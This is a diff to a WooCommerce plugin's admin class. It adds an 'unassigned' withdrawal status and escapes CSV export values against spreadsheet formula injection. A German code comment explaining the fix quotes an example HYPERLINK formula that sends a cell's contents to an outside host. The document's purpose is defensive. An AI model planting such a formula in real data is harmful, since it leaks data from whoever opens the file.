@@ -43,10 +43,13 @@ class Admin {
 	 */
 	public static function statuses() {
 		return array(
-			'eingegangen'    => __( 'Eingegangen', 'widerrufsbutton-fuer-woocommerce' ),
-			'in_bearbeitung' => __( 'In Bearbeitung', 'widerrufsbutton-fuer-woocommerce' ),
-			'bestaetigt'     => __( 'Bestätigt', 'widerrufsbutton-fuer-woocommerce' ),
-			'abgelehnt'      => __( 'Abgelehnt', 'widerrufsbutton-fuer-woocommerce' ),
+			'eingegangen'     => __( 'Eingegangen', 'widerrufsbutton-fuer-woocommerce' ),
+			// Erklärung ist zugegangen und damit wirksam, ließ sich aber keiner
+			// Bestellung zuordnen – braucht eine manuelle Klärung.
+			'nicht_zugeordnet' => __( 'Nicht zugeordnet', 'widerrufsbutton-fuer-woocommerce' ),
+			'in_bearbeitung'  => __( 'In Bearbeitung', 'widerrufsbutton-fuer-woocommerce' ),
+			'bestaetigt'      => __( 'Bestätigt', 'widerrufsbutton-fuer-woocommerce' ),
+			'abgelehnt'       => __( 'Abgelehnt', 'widerrufsbutton-fuer-woocommerce' ),
 		);
 	}
 
@@ -377,25 +380,53 @@ class Admin {
 		foreach ( $result['items'] as $row ) {
 			fputcsv(
 				$out,
-				array(
-					$row['id'],
-					$row['created_at'],
-					$row['order_number'],
-					$row['order_id'],
-					$row['scope'],
-					$row['product_id'],
-					$row['sku'],
-					$row['name'],
-					$row['email'],
-					$row['reason'],
-					$row['status'],
-					$row['verification_status'],
-					$row['confirmation_sent'],
+				array_map(
+					array( $this, 'csv_escape' ),
+					array(
+						$row['id'],
+						$row['created_at'],
+						$row['order_number'],
+						$row['order_id'],
+						$row['scope'],
+						$row['product_id'],
+						$row['sku'],
+						$row['name'],
+						$row['email'],
+						$row['reason'],
+						$row['status'],
+						$row['verification_status'],
+						$row['confirmation_sent'],
+					)
 				)
 			);
 		}
 
 		fclose( $out );
 		exit;
+	}
+
+	/**
+	 * Entschärft Tabellenkalkulations-Formeln in CSV-Werten.
+	 *
+	 * Namen und Gründe stammen aus einem loginfreien Formular. sanitize_text_field()
+	 * entfernt weder "=" noch Klammern, sodass ein Wert wie
+	 * =HYPERLINK("https://.../?x="&A1) beim Öffnen der Exportdatei in Excel oder
+	 * LibreOffice als Formel ausgeführt würde – der Angreifer erreicht damit den
+	 * Rechner des Shop-Betreibers. Ein vorangestelltes Apostroph zwingt die
+	 * Tabellenkalkulation zur Text-Interpretation.
+	 *
+	 * @param mixed $value Zellwert.
+	 * @return mixed
+	 */
+	private function csv_escape( $value ) {
+		if ( ! is_string( $value ) || '' === $value ) {
+			return $value;
+		}
+
+		if ( in_array( substr( $value, 0, 1 ), array( '=', '+', '-', '@', "\t", "\r" ), true ) ) {
+			return "'" . $value;
+		}
+
+		return $value;
 	}
 }
